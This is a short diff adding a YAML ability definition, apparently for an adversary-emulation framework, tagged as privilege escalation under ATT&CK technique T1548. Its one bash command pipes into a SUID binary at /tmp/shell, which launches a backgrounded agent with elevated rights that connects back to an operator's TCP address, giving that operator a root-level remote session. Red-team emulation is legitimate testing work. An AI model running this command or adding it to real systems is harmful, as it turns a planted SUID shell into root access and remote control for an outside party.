@@ -1,0 +1,19 @@
+id: d3ec0a2e-44fd-4b32-8c02-58fd4d8009dc
+name: Execute Eleveated Suid Shell
+description: 'Executes the Elevated Suid binary to return an elevated shell. '
+tactic: privilege-escalation
+technique:
+  id: T1548
+  name: Abuse Elevation Control Mechanism
+platforms:
+  linux:
+    bash:
+      command: >-
+        echo 'nohup #{agent.location} -address #{operator.tcp} -range Testing
+        -name Elevated >/dev/null 2>&1 &' | /tmp/shell
+      payload: ''
+metadata:
+  authors:
+    - gerbsec
+  tags: []
+  enabled: true
